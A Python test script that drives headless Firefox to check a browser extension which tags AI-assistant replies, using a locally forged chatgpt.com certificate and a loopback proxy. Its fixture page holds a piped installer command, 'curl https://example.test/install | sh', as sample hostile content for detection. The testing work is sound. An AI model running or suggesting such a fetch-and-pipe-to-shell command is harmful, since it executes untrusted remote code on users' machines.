#!/usr/bin/env python3
"""Execute an isolated temporary Firefox package against local synthetic fixtures only."""
import argparse
import base64
from datetime import datetime, timezone
import hashlib
import http.server
import importlib.util
import json
import os
from pathlib import Path
import secrets
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import uuid
import urllib.request

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location('firefox_package', ROOT/'scripts/build-firefox-extension.py')
builder = importlib.util.module_from_spec(spec); spec.loader.exec_module(builder)


SERVICE_FILES = {
    'gateway': ['app.py', 'healthcheck.py', 'requirements.lock', 'protocol/http_privacy.py',
                'protocol/normalization.py', 'protocol/replay_identity.py',
                'protocol/transport_signing.py', 'protocol/unicode15-data.json'],
    'evaluator': ['app.py', 'healthcheck.py', 'requirements.lock', 'protocol/http_privacy.py'],
    'anonymizer': ['app.py', 'healthcheck.py', 'requirements.lock', 'model_identity.py',
                  'replay_metadata.py', 'protocol/http_privacy.py', 'protocol/replay_identity.py'],
}


def bind_service_sources(service_root, root=ROOT):
    service_root=Path(service_root).absolute();root=Path(root).absolute();bound={}
    for role, files in SERVICE_FILES.items():
        for filename in files:
            source=filename if filename.startswith('protocol/') else 'services/'+role+'/'+filename
            expected=hashlib.sha256(builder.regular(root/source)).hexdigest()
            observed=hashlib.sha256(builder.regular(service_root/role/'app'/filename)).hexdigest()
            if observed!=expected:raise ValueError('Actual service source differs')
            bound[source]=expected
    return bound



class Driver:
    def __init__(self, port):
        self.socket = socket.create_connection(('127.0.0.1', port), timeout=3)
        self.socket.settimeout(20)
        self.stream = self.socket.makefile('rb'); self.identifier = 0
        self.read()

    def read(self):
        digits = bytearray()
        while True:
            value = self.stream.read(1)
            if not value: raise ValueError('Driver disconnected')
            if value == b':': break
            digits.extend(value)
            if len(digits) > 9 or not digits.isdigit(): raise ValueError('Driver frame limit')
        count = int(digits)
        if not 0 < count <= 2_000_000: raise ValueError('Driver payload limit')
        raw = self.stream.read(count)
        if len(raw) != count: raise ValueError('Driver truncated')
        return json.loads(raw)

    def command(self, name, parameters=None):
        self.identifier += 1
        self.last_command=name
        raw = json.dumps([0, self.identifier, name, parameters or {}]).encode()
        self.socket.sendall(str(len(raw)).encode() + b':' + raw)
        response = self.read()
        if not isinstance(response, list) or response[:2] != [1, self.identifier] or len(response) != 4:
            raise ValueError('Driver response identity')
        if response[2]:
            self.last_error=response[2].get('error','unknown') if isinstance(response[2],dict) else 'unknown'
            raise ValueError('Driver command refused')
        return response[3]

    def context(self, value): self.command('Marionette:SetContext', {'value': value})

    def script(self, source, args=None):
        result = self.command('WebDriver:ExecuteScript', {'script': source, 'args': args or [],
            'newSandbox': True, 'sandbox': 'default', 'line': 0, 'filename': 'owned-firefox-check'})
        return result.get('value') if isinstance(result, dict) and set(result) == {'value'} else result

    def navigate(self, url): self.command('WebDriver:Navigate', {'url': url})

    def wait(self, source, args=None, timeout=12):
        end = time.monotonic() + timeout
        while time.monotonic() < end:
            value = self.script(source, args)
            if value: return value
            time.sleep(.1)
        raise ValueError('Browser condition timeout')

    def tag_label(self):
        element=self.command('WebDriver:FindElement',{'using':'css selector','value':'article .aitrust-mount'})
        element=element.get('value',element)['element-6066-11e4-a52e-4f735466cecf']
        shadow=self.command('WebDriver:GetShadowRoot',{'id':element})
        shadow=shadow.get('value',shadow)['shadow-6066-11e4-a52e-4f735466cecf']
        tag=self.command('WebDriver:FindElementFromShadowRoot',{'shadowRoot':shadow,'using':'css selector','value':'.tag'})
        tag=tag.get('value',tag)['element-6066-11e4-a52e-4f735466cecf']
        result=self.command('WebDriver:GetComputedLabel',{'id':tag})
        return result.get('value',result) if isinstance(result,dict) else result

    def close(self):
        self.stream.close(); self.socket.close()


def certificate(directory):
    def run(args):
        subprocess.run(['openssl', *args], cwd=directory, capture_output=True, check=True, timeout=20)
    run(['ecparam','-name','prime256v1','-genkey','-noout','-out','ca.key'])
    run(['req','-new','-x509','-key','ca.key','-out','ca.pem','-days','1',
         '-subj','/CN=Owned AITrust Synthetic Fixture CA','-addext','basicConstraints=critical,CA:TRUE',
         '-addext','keyUsage=critical,keyCertSign,cRLSign'])
    run(['ecparam','-name','prime256v1','-genkey','-noout','-out','server.key'])
    run(['req','-new','-key','server.key','-out','server.csr','-subj','/CN=chatgpt.com'])
    (directory/'server.ext').write_text('basicConstraints=critical,CA:FALSE\nkeyUsage=critical,digitalSignature\nextendedKeyUsage=serverAuth\nsubjectAltName=DNS:chatgpt.com\n')
    run(['x509','-req','-in','server.csr','-CA','ca.pem','-CAkey','ca.key','-set_serial','1',
         '-days','1','-extfile','server.ext','-out','server.pem'])
    run(['ecparam','-name','prime256v1','-genkey','-noout','-out','signing.key'])
    public = subprocess.run(['openssl','pkey','-in',str(directory/'signing.key'),'-pubout','-outform','DER'],
                            capture_output=True,check=True,timeout=20).stdout[-65:]
    if len(public) != 65 or public[0] != 4: raise ValueError('Fixture public key')
    profile = {'profile':'loopback-response/p256-sha256/v1',
               'key_id':hashlib.sha256(public).hexdigest(),
               'public_key':base64.urlsafe_b64encode(public).decode().rstrip('=')}
    return profile


def sign(directory, message):
    der = subprocess.run(['openssl','dgst','-sha256','-sign',str(directory/'signing.key')],
                         input=message,capture_output=True,check=True,timeout=10).stdout
    if len(der) < 8 or der[0] != 0x30 or der[1] != len(der)-2: raise ValueError('Fixture signature')
    offset=2; parts=[]
    for _ in range(2):
        if der[offset] != 2: raise ValueError('Fixture integer')
        length=der[offset+1];parts.append(int.from_bytes(der[offset+2:offset+2+length],'big').to_bytes(32,'big'))
        offset+=2+length
    if offset != len(der):raise ValueError('Fixture DER length')
    return base64.urlsafe_b64encode(b''.join(parts)).decode().rstrip('=')


def verify(binary, diagnostics=None, service_root=None):
    cases=[]; stage='sources'; process=None; client=None; servers=[]; before={}; observation={}; service_processes=[]; service_logs=[]
    def passed(name, condition=True):
        if not condition: raise ValueError('Acceptance refused')
        cases.append(name)
    package, proof = builder.package()
    before = {**proof['sources'], 'scripts/build-firefox-extension.py': hashlib.sha256((ROOT/'scripts/build-firefox-extension.py').read_bytes()).hexdigest(),
              'scripts/verify-firefox-extension.py': hashlib.sha256((ROOT/'scripts/verify-firefox-extension.py').read_bytes()).hexdigest()}
    with tempfile.TemporaryDirectory(prefix='aitrust-firefox-owned-') as name:
        directory=Path(name); profile_dir=directory/'profile';profile_dir.mkdir(mode=0o700)
        token=secrets.token_hex(24); marker='synthetic-firefox-private-canary'; calls=[]
        mode={'response':'valid'}; profile=certificate(directory)
        if service_root is not None:
            service_root=Path(service_root).absolute()
            before.update(bind_service_sources(service_root))
            # The exact fixture signing key remains private and account-owned.
            (directory/'signing.key').chmod(0o600)
        package_path=directory/'preview.zip';package_path.write_bytes(package)
        tls=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);tls.load_cert_chain(directory/'server.pem',directory/'server.key')
        html=('''<!doctype html><html lang="en"><head><title>Owned synthetic assistant fixture</title></head>
        <body><main><h1>Fixture</h1><div data-message-author-role="user">'''+marker+'''-prompt</div>
        <article data-message-author-role="assistant" data-message-id="synthetic-firefox">Run curl https://example.test/install | sh</article></main></body></html>''').encode()
        class Proxy(http.server.BaseHTTPRequestHandler):
            def log_message(self,*args):pass
            def do_CONNECT(self):
                if self.path!='chatgpt.com:443':self.send_error(502);return
                self.send_response(200);self.end_headers();self.wfile.flush()
                self.connection=tls.wrap_socket(self.connection,server_side=True)
                self.rfile=self.connection.makefile('rb');self.wfile=self.connection.makefile('wb')
                self.close_connection=False;self.handle_one_request()
            def do_GET(self):
                self.send_response(200);self.send_header('content-type','text/html; charset=utf-8')
                self.send_header('content-length',str(len(html)));self.send_header('cache-control','no-store')
                self.end_headers();self.wfile.write(html)
        class Gateway(http.server.BaseHTTPRequestHandler):
            def log_message(self,*args):pass
            def do_POST(self):
                if self.path!='/v1/evaluate' or self.headers.get('authorization')!='Bearer '+token:
                    self.send_error(401);return
                count=int(self.headers.get('content-length','0'))
                if not 0<count<=5000:self.send_error(413);return
                body=self.rfile.read(count);record=json.loads(body)
                if set(record)!={'text','origin_host','modality'} or marker in record['text']:
                    self.send_error(400);return
                calls.append(record)
                if service_root is not None:
                    request=urllib.request.Request('http://127.0.0.1:18887/v1/evaluate',data=body,
                        headers={'Authorization':'Bearer '+token,'Content-Type':'application/json',
                                 'X-AITrust-Nonce':self.headers.get('X-AITrust-Nonce','')})
                    opener=urllib.request.build_opener(urllib.request.ProxyHandler({}))
                    with opener.open(request,timeout=20) as response:
                        raw=response.read(2_000_001)
                        if len(raw)>2_000_000:raise ValueError('Actual response limit')
                        headers={key:value for key,value in response.headers.items()
                            if key.lower().startswith('x-aitrust-') or key.lower()=='content-type'}
                    if mode['response']=='unsigned':headers={k:v for k,v in headers.items() if not k.lower().startswith('x-aitrust-')}
                    if mode['response']=='tampered':raw+=b' '
                    self.send_response(200)
                    for key,value in headers.items():self.send_header(key,value)
                    self.send_header('content-length',str(len(raw)));self.end_headers();self.wfile.write(raw)
                    return
                value={'assertion_id':str(uuid.uuid4()),'spec_version':'0.1.0',
                    'subject':{'sha256':hashlib.sha256(record['text'].encode()).hexdigest(),
                      'char_len':len(record['text']),'origin_host':record['origin_host'],'modality':'text',
                      'captured_at':datetime.now(timezone.utc).isoformat()},
                    'tags':[{'code':'PS','confidence':.97,'floor':.7,'state':'asserted',
                      'signals':[{'id':'sig.piped_installer.v3','score':.97,'spans':[[0,len(record['text'])]]}]}],
                    'abstentions':[],'evaluator':{'models':[{'name':'synthetic-browser-test',
                      'revision':'synthetic-v1','sha256':'a'*64}],'calibration_id':'synthetic-unvalidated','latency_ms':1}}
                raw=json.dumps(value,separators=(',',':')).encode()
                prefix=(profile['profile']+'\n'+self.headers.get('X-AITrust-Nonce','')+'\n'+hashlib.sha256(body).hexdigest()+'\n').encode()
                self.send_response(200);self.send_header('content-type','application/json')
                self.send_header('cache-control','no-store')
                if mode['response']!='unsigned':
                    self.send_header('X-AITrust-Profile',profile['profile']);self.send_header('X-AITrust-Key',profile['key_id'])
                    self.send_header('X-AITrust-Signature',sign(directory,prefix+raw))
                if mode['response']=='tampered':raw+=b' '
                self.send_header('content-length',str(len(raw)));self.end_headers();self.wfile.write(raw)
        try:
            if service_root is not None:
                stage='actual_service_startup'
                for role,port in [('anonymizer',18888),('evaluator',18889),('gateway',18887)]:
                    env=dict(os.environ,PYTHONPATH=str(service_root/role/'lib'),
                        AITRUST_TOKEN=token,AITRUST_SIGNING_KEY_FILE=str(directory/'signing.key'),
                        ANONYMIZER_URL='http://127.0.0.1:18888',EVALUATOR_URL='http://127.0.0.1:18889',
                        OPENBLAS_NUM_THREADS='1',OMP_NUM_THREADS='1',MKL_NUM_THREADS='1')
                    log=(directory/(role+'.log')).open('wb');service_logs.append(log)
                    env['AITRUST_TEST_PORT']=str(port)
                    runner = ('import os,sys,threading,uvicorn\n'
                        'server=uvicorn.Server(uvicorn.Config("protocol.http_privacy:application",factory=True,'
                        'host="127.0.0.1",port=int(os.environ["AITRUST_TEST_PORT"]),access_log=False))\n'
                        'def stop():\n sys.stdin.buffer.read(1)\n server.should_exit=True\n'
                        'threading.Thread(target=stop,daemon=True).start()\nserver.run()\n')
                    proc=subprocess.Popen([sys.executable,'-S','-c',runner],stdin=subprocess.PIPE,
                        cwd=service_root/role/'app',env=env,stdout=log,stderr=log)
                    service_processes.append(proc)
                    deadline=time.monotonic()+40;ready=False
                    opener=urllib.request.build_opener(urllib.request.ProxyHandler({}))
                    while time.monotonic()<deadline:
                        if proc.poll() is not None:raise ValueError('Actual service exited')
                        try:
                            with opener.open('http://127.0.0.1:'+str(port)+'/healthz',timeout=1) as response:
                                ready=response.status==200 and json.loads(response.read(4096)).get('ok') is True
                            if ready:break
                        except (OSError,ValueError):time.sleep(.2)
                    if not ready:raise ValueError('Actual service readiness timeout')
                passed('three_actual_source_verified_services_ready')
            stage='fixture_servers'
            for handler,port in [(Proxy,0),(Gateway,8787)]:
                server=http.server.ThreadingHTTPServer(('127.0.0.1',port),handler);servers.append(server)
                threading.Thread(target=server.serve_forever,daemon=True).start()
            port_probe=socket.socket();port_probe.bind(('127.0.0.1',0));port=port_probe.getsockname()[1];port_probe.close()
            prefs={'marionette.port':port,'remote.prefs.recommended':True,
                'network.proxy.type':1,'network.proxy.http':'127.0.0.1','network.proxy.http_port':servers[0].server_port,
                'network.proxy.ssl':'127.0.0.1','network.proxy.ssl_port':servers[0].server_port,
                'network.proxy.no_proxies_on':'127.0.0.1,localhost','network.proxy.allow_hijacking_localhost':False,
                'network.captive-portal-service.enabled':False,'network.connectivity-service.enabled':False,
                'browser.shell.checkDefaultBrowser':False,'browser.startup.homepage_override.mstone':'ignore'}
            (profile_dir/'user.js').write_text(''.join('user_pref('+json.dumps(k)+','+json.dumps(v)+');\n' for k,v in prefs.items()))
            stage='browser_startup'
            with (directory/'browser.log').open('wb') as log:
                process=subprocess.Popen([str(binary),'-no-remote','-headless','-profile',str(profile_dir),
                    '--marionette','--remote-allow-system-access'],stdout=log,stderr=log)
                deadline=time.monotonic()+30
                while time.monotonic()<deadline:
                    if process.poll() is not None:raise ValueError('Browser startup exit')
                    try:client=Driver(port);break
                    except ConnectionRefusedError:time.sleep(.2)
                if client is None:raise ValueError('Browser startup timeout')
                session=client.command('WebDriver:NewSession',{'capabilities':{'alwaysMatch':{'acceptInsecureCerts':False}}})
                capabilities=session.get('capabilities',{})
                passed('TLS_verification_enabled',capabilities.get('acceptInsecureCerts') is False)
                stage='temporary_installation'
                installed=client.command('Addon:Install',{'path':str(package_path),'temporary':True})
                installed=installed.get('value',installed) if isinstance(installed,dict) else installed
                passed('actual_temporary_install',installed=='preview@aitrustid.com')
                client.context('chrome')
                ca=''.join((directory/'ca.pem').read_text().splitlines()[1:-1])
                client.script('Cc["@mozilla.org/security/x509certdb;1"].getService(Ci.nsIX509CertDB).addCertFromBase64(arguments[0],"CT,,");return true;',[ca])
                ids=json.loads(client.script("return Services.prefs.getStringPref('extensions.webextensions.uuids','{}');"))
                addon_url='moz-extension://'+ids['preview@aitrustid.com']
                client.context('content');client.navigate(addon_url+'/src/options.html')
                client.wait('return document.querySelector("#checks-enabled") && !document.querySelector("#checks-enabled").disabled;')
                passed('default_paused',client.script('return document.querySelector("#checks-enabled").checked===false;'))
                stage='settings'
                client.script('document.querySelector("#token").value=arguments[0];document.querySelector("form").requestSubmit();return true;',[token])
                client.wait('return document.querySelector("#saved-token").textContent.includes("A local token is saved");')
                passed('token_save_does_not_enable',client.script('return !document.querySelector("#checks-enabled").checked && document.querySelector("#token").value==="";'))
                # Actual public-file control; only a generated public key is placed in the DOM.
                client.script('const file=new File([JSON.stringify(arguments[0])],"public.json",{type:"application/json"});const dt=new DataTransfer();dt.items.add(file);const input=document.querySelector("#gateway-key");input.files=dt.files;input.dispatchEvent(new Event("change",{bubbles:true}));return true;',[profile])
                client.wait('return document.querySelector("#saved-key").textContent.includes("Selected key fingerprint");')
                passed('key_save_does_not_enable',client.script('return !document.querySelector("#checks-enabled").checked;'))
                stage='paused_vendor_fixture';client.navigate('https://chatgpt.com/aitrust-owned-synthetic')
                time.sleep(1)
                passed('paused_no_capture',not calls and client.script('return !document.querySelector("article .aitrust-mount");'))
                client.navigate(addon_url+'/src/options.html')
                client.wait('return !document.querySelector("#checks-enabled").disabled;')
                element=client.command('WebDriver:FindElement',{'using':'css selector','value':'#checks-enabled'}); element=element.get('value',element)
                client.command('WebDriver:ElementClick',{'id':element['element-6066-11e4-a52e-4f735466cecf']})
                stage='origin_permission_prompt'
                client.context('chrome')
                prompt_open=client.script('return typeof PopupNotifications!=="undefined" && PopupNotifications.panel.state==="open";')
                observation['origin_prompt_open']=prompt_open
                if prompt_open:
                    prompt=client.command('WebDriver:FindElement',{'using':'css selector','value':'#addon-webext-permissions-notification .popup-notification-primary-button'});prompt=prompt.get('value',prompt)
                    client.command('WebDriver:ElementClick',{'id':prompt['element-6066-11e4-a52e-4f735466cecf']})
                client.context('content')
                client.wait('return document.querySelector("#checks-enabled").checked && !document.querySelector("#checks-enabled").disabled;')
                client.context('chrome')
                observation['allowed_origins']=client.script("const p=WebExtensionPolicy.getByID('preview@aitrustid.com');return p?{vendor:p.allowedOrigins.matches('https://chatgpt.com/aitrust-owned-synthetic'),loopback:p.allowedOrigins.matches('http://127.0.0.1:8787/v1/evaluate')}:null;")
                client.context('content')
                stage='authenticated_capture';client.navigate('https://chatgpt.com/aitrust-owned-synthetic')
                observation['fixture_visible']=client.script('return !!document.querySelector("article[data-message-author-role=assistant]") && location.hostname==="chatgpt.com";')
                client.wait('return !!document.querySelector("article .aitrust-mount");')
                deadline=time.monotonic()+12
                while not calls and time.monotonic()<deadline:time.sleep(.1)
                passed('assistant_only_capture',len(calls)==1 and calls[0]['origin_host']=='chatgpt.com' and marker not in calls[0]['text'])
                deadline=time.monotonic()+12;label=''
                while time.monotonic()<deadline:
                    label=client.tag_label()
                    if label.startswith('PS:'):break
                    time.sleep(.1)
                passed('authenticated_compact_tag_rendered',label.startswith('PS:'))
                for failure in ['unsigned','tampered']:
                    stage='refuse_'+failure;mode['response']=failure
                    client.navigate('https://chatgpt.com/aitrust-owned-synthetic')
                    client.wait('return !!document.querySelector("article .aitrust-mount");')
                    deadline=time.monotonic()+12;label=''
                    while time.monotonic()<deadline:
                        label=client.tag_label()
                        if 'valid local evaluation could not be obtained' in label:break
                        time.sleep(.1)
                    passed(failure+'_cannot_render_a_finding','valid local evaluation could not be obtained' in label and not label.startswith('PS:'))
                mode['response']='valid'
                stage='pause_reset'
                client.context('content');client.navigate(addon_url+'/src/options.html')
                client.wait('return !document.querySelector("#checks-enabled").disabled;')
                client.script('document.querySelector("#checks-enabled").click();return true;')
                client.wait('return !document.querySelector("#checks-enabled").checked;')
                before_pause=len(calls);client.navigate('https://chatgpt.com/aitrust-owned-synthetic');time.sleep(1)
                passed('pause_refuses_new_capture',len(calls)==before_pause and client.script('return !document.querySelector("article .aitrust-mount");'))
                client.navigate(addon_url+'/src/options.html');client.wait('return !document.querySelector("#checks-enabled").disabled;')
                client.script('document.querySelector("#clear").click();return true;')
                client.wait('return document.querySelector("#saved-token").textContent.includes("No local token") && document.querySelector("#saved-key").textContent.includes("No gateway key selected");')
                passed('reset_clears_token_key_and_consent',client.script('return !document.querySelector("#checks-enabled").checked;'))
                stage='uninstall';client.navigate('https://chatgpt.com/aitrust-owned-synthetic');client.command('Addon:Uninstall',{'id':installed})
                client.navigate('https://chatgpt.com/aitrust-owned-synthetic');time.sleep(1)
                passed('uninstall_removes_route',not client.script('return !!document.querySelector(".aitrust-mount");') and len(calls)==before_pause)
                stage='source_stability'
                passed('source_unchanged',all(hashlib.sha256((ROOT/name).read_bytes()).hexdigest()==digest for name,digest in before.items()))
                return {'captured_at':datetime.now(timezone.utc).isoformat(),'pass':True,
                    'profile':'firefox-temporary-preview/v1','browser_name':capabilities.get('browserName'),
                    'browser_version':capabilities.get('browserVersion'),'platform':capabilities.get('platformName'),
                    'actual_temporary_addon':True,'synthetic_vendor':True,'synthetic_authenticated_gateway':service_root is None,
                    'actual_source_verified_services':service_root is not None,
                    'TLS_verification_disabled':False,'live_vendor_verified':False,'store_signed':False,
                    'independent_accuracy_evidence':False,'physical_phone':False,'requirements_closed':0,
                    'cases':cases,'case_count':len(cases),'package_sha256':proof['sha256'],'sources':before}
        except Exception as error:
            if client:
                observation['last_command']=getattr(client,'last_command','none')
                observation['last_driver_error']=getattr(client,'last_error','none')
                if stage=='origin_permission_prompt':
                    try:
                        client.context('chrome')
                        observation['permission_UI']=client.script('return {panelState:typeof PopupNotifications!=="undefined"?PopupNotifications.panel.state:null,nodes:Array.from(document.querySelectorAll("[id*=permissions],popupnotification")).slice(0,20).map(n=>({id:n.id,tag:n.localName}))};')
                        client.context('content')
                        observation['option_state']=client.script('return {disabled:document.querySelector("#checks-enabled").disabled,checked:document.querySelector("#checks-enabled").checked,permissionFailure:document.querySelector("#status").textContent.includes("Could not obtain Firefox permission"),permissionDenied:document.querySelector("#status").textContent.includes("not granted")};')
                    except (ValueError,OSError):pass
            return {'captured_at':datetime.now(timezone.utc).isoformat(),'pass':False,'stage':stage,
                'error_class':type(error).__name__,'completed_cases':cases,'sources':before,
                'requirements_closed':0,'independent_accuracy_evidence':False,'diagnostic_observation':observation}
        finally:
            if client:
                if process and process.poll() is None:
                    try:client.command('Marionette:Quit',{'flags':['eForceQuit']})
                    except (ValueError,OSError):pass
                    try:process.wait(timeout=8)
                    except subprocess.TimeoutExpired:pass
                try:client.close()
                except OSError:pass
            if diagnostics is not None:
                diagnostics=Path(diagnostics).absolute()
                info=diagnostics.stat()
                if diagnostics.is_symlink() or not diagnostics.is_dir() or info.st_uid!=os.getuid() or info.st_mode & 0o077:
                    raise ValueError('Private diagnostic directory required')
                for filename in ['browser.log','gateway.log','evaluator.log','anonymizer.log']:
                    log_file=directory/filename
                    if not log_file.is_file():continue
                    descriptor=os.open(diagnostics/filename,os.O_WRONLY|os.O_CREAT|os.O_EXCL|os.O_NOFOLLOW,0o600)
                    with os.fdopen(descriptor,'wb') as output:
                        output.write(log_file.read_bytes()[-32000:])
            if process and process.poll() is None:
                try:
                    process.terminate()
                    try:process.wait(timeout=8)
                    except subprocess.TimeoutExpired:process.kill();process.wait(timeout=5)
                except (OSError,subprocess.TimeoutExpired):
                    return {'captured_at':datetime.now(timezone.utc).isoformat(),'pass':False,
                        'stage':'browser_cleanup','preceding_stage':stage,'completed_cases':cases,
                        'sources':before,'requirements_closed':0,'independent_accuracy_evidence':False,'diagnostic_observation':observation}
            for server in servers:server.shutdown();server.server_close()
            service_cleanup_errors=[]
            for proc in reversed(service_processes):
                if proc.poll() is None:
                    try:
                        # An owned pipe requests shutdown inside the service; no
                        # capability escalation or new administrative endpoint.
                        proc.stdin.write(b'\0');proc.stdin.flush();proc.stdin.close()
                        proc.wait(timeout=8)
                    except (OSError,subprocess.TimeoutExpired) as error:
                        service_cleanup_errors.append(type(error).__name__)
            for log in service_logs:log.close()
            if service_cleanup_errors:
                return {'captured_at':datetime.now(timezone.utc).isoformat(),'pass':False,
                    'stage':'service_cleanup','preceding_stage':stage,'cleanup_errors':service_cleanup_errors,
                    'completed_cases':cases,'sources':before,'requirements_closed':0,
                    'independent_accuracy_evidence':False,'diagnostic_observation':observation}



if __name__=='__main__':
    parser=argparse.ArgumentParser(description=__doc__);parser.add_argument('--firefox',type=Path,required=True)
    parser.add_argument('--diagnostics-dir',type=Path)
    parser.add_argument('--service-root',type=Path,help='Owned prepared fixture roles; source must match checkout')
    args=parser.parse_args()
    try:result=verify(args.firefox,args.diagnostics_dir,args.service_root)
    except (OSError,ValueError,subprocess.SubprocessError) as error:
        result={'captured_at':datetime.now(timezone.utc).isoformat(),'pass':False,'stage':'fixture_preflight','error_class':type(error).__name__,'requirements_closed':0}
    print(json.dumps(result,indent=2));raise SystemExit(0 if result['pass'] else 1)
